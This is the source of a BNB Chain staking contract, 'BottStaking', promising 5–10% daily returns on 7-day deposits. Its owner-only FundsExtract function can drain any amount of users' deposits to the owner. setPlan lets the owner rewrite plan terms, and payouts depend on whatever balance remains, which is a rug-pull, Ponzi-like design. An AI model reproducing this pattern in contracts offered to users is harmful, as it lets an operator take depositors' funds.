/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

contract BottStaking {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 5e16;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalStaked;
    uint256 public totalTradingFunds;
    uint256 public totalInjectFunds;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 start;
		uint256 finish;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
        uint256 withdrawn;
	}

	mapping (address => User) public users;

	address payable public owner;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
    event InjectFunds(address indexed sender);

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

	constructor(address payable _owner) public {
		require(!isContract(_owner), "Bott: Owner should be wallet address");
		owner = _owner;

        plans.push(Plan(7, 100));
        plans.push(Plan(7, 80));
        plans.push(Plan(7, 50));
	}

	function invest(uint8 _plan) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT, "Bott: Minimum deposit amount should be bigger than 0.05 bnb");
        require(_plan < 3, "Bott: Invalid plan");
        owner.transfer(msg.value.mul(2).div(100));

		User storage user = users[msg.sender];

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		(uint256 percent, uint256 finish) = getResult(_plan);
		user.deposits.push(Deposit(_plan, percent, msg.value, block.timestamp, finish));

		totalStaked = totalStaked.add(msg.value);
		emit NewDeposit(msg.sender, _plan, percent, msg.value, block.timestamp, finish);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAvailable = getUserAvailable(msg.sender);

		require(totalAvailable >= 5e15, "Bott: Minimum withdraw limit is 0.005 bnb");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAvailable) {
			totalAvailable = contractBalance;
		}
        
		(msg.sender).transfer(totalAvailable);

		user.checkpoint = block.timestamp;
        user.withdrawn = user.withdrawn.add(totalAvailable);
	
		emit Withdrawn(msg.sender, totalAvailable);

	}
	
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 _plan) public view returns(uint256 time, uint256 percent) {
		time = plans[_plan].time;
		percent = plans[_plan].percent;
	}

    function setPlan(uint8 _plan, uint256 _time, uint256 _percent) external onlyOwner {
        plans[_plan].time = _time;
        plans[_plan].percent = _percent;
    }

    function setNewOwner(address payable _newOwner) external onlyOwner {
        require(!isContract(_newOwner), "Bott: Owner should be wallet address");
        owner = _newOwner;
    }

    function FundsExtract(uint256 _amount) external onlyOwner {
        totalTradingFunds = totalTradingFunds.add(_amount);
        owner.transfer(_amount);
    }

    function FundsInject() external payable onlyOwner {
        totalInjectFunds = totalInjectFunds.add(msg.value);
        emit InjectFunds(msg.sender);
    }

	function getResult(uint8 _plan) public view returns (uint256 percent, uint256 finish) {
		percent = plans[_plan].percent;

		finish = block.timestamp.add(plans[_plan].time.mul(TIME_STEP));
	}
	
	
	function getUserAvailable(address _user) public view returns (uint256) {
		User storage user = users[_user];

		uint256 totalAvailable;
        uint256 from;
        uint256 to;
        uint256 rewardPerDay;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (block.timestamp > user.deposits[i].finish) {
                uint256 available;
                rewardPerDay = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);	
                from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
                to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
                if (from < to) {
                    available = rewardPerDay.mul(to.sub(from)).div(TIME_STEP);
                }	
                totalAvailable = totalAvailable.add(available);
            }			
		}

		return totalAvailable;
	}

	function getUserCheckpoint(address _user) public view returns(uint256) {
		return users[_user].checkpoint;
	}

	function getUserAmountOfDeposits(address _user) public view returns(uint256) {
		return users[_user].deposits.length;
	}

	function getUserTotalDeposits(address _user) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[_user].deposits.length; i++) {
			amount = amount.add(users[_user].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address _user, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[_user];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}